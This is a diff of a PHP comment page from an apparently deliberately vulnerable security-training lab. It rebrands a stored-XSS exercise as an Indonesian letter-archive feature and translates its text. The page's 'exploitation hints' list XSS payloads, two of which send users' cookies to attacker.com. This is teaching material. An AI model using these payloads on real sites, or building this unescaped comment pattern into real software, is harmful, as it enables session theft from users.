@@ -37,7 +37,7 @@ $result = $mysqli->query($query);
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DVWA - XSS Stored</title>
+    <title>Sistem Arsip Surat - Komentar Surat</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -144,33 +144,28 @@ $result = $mysqli->query($query);
 </head>
 <body>
     <div class="container">
-        <a href="dashboard.php" class="back-link">← Back to Dashboard</a>
-        
-        <h1>XSS - Stored Lab</h1>
-        
+        <a href="dashboard.php" class="back-link">← Kembali ke Dasbor</a>
+        <h1>Komentar Surat</h1>
         <div class="info-box">
-            <h2>Stored Cross-Site Scripting</h2>
-            <p>Post comments that are stored in the database. Malicious scripts are executed when the page loads.</p>
+            <h2>Tambah Komentar Surat</h2>
+            <p>Tambahkan komentar pada surat masuk/keluar. Komentar akan tampil ke semua user. Fitur ini rentan terhadap Stored XSS.</p>
         </div>
-        
         <form method="POST" action="reset_db.php" style="margin-bottom: 20px;">
             <input type="hidden" name="page" value="xss_stored.php">
-            <button type="submit" name="reset_db" style="background-color: #ff6600; padding: 8px 15px; font-size: 14px;">🔄 Reset Database</button>
+            <button type="submit" name="reset_db" style="background-color: #ff6600; padding: 8px 15px; font-size: 14px;">🔄 Reset Komentar</button>
         </form>
-        
         <form method="POST">
             <div class="form-group">
-                <label for="comment">Post a Comment</label>
+                <label for="comment">Komentar Surat</label>
                 <textarea id="comment" name="comment" required></textarea>
             </div>
-            <button type="submit">Post Comment</button>
+            <button type="submit">Posting Komentar</button>
         </form>
-        
         <div class="hint">
-            <strong>Exploitation Hints:</strong><br>
-            • Try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Script will execute for every user viewing this page<br>
-            • Try: <code>&lt;img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)"&gt;</code> - Steal cookies<br>
-            • Try: <code>&lt;svg onload="document.location='https://attacker.com/?cookie='+document.cookie"&gt;</code> - Redirect with data theft
+            <strong>Petunjuk Eksploitasi:</strong><br>
+            • Coba: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Skrip akan dieksekusi untuk setiap user yang melihat komentar<br>
+            • Coba: <code>&lt;img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)"&gt;</code> - Curi cookie user<br>
+            • Coba: <code>&lt;svg onload="document.location='https://attacker.com/?cookie='+document.cookie"&gt;</code> - Redirect dengan pencurian data
         </div>
         
         <?php if ($message): ?>
@@ -178,7 +173,7 @@ $result = $mysqli->query($query);
         <?php endif; ?>
         
         <div class="comments">
-            <h3>Comments (<?php echo $result->num_rows; ?>)</h3>
+            <h3>Daftar Komentar (<?php echo $result->num_rows; ?>)</h3>
             <?php if ($result->num_rows > 0): ?>
                 <?php while ($row = $result->fetch_assoc()): ?>
                     <div class="comment">
@@ -192,7 +187,7 @@ $result = $mysqli->query($query);
                     </div>
                 <?php endwhile; ?>
             <?php else: ?>
-                <p style="color: #aaa;">No comments yet. Be the first to post!</p>
+                <p style="color: #aaa;">Belum ada komentar. Jadilah yang pertama posting!</p>
             <?php endif; ?>
         </div>
     </div>
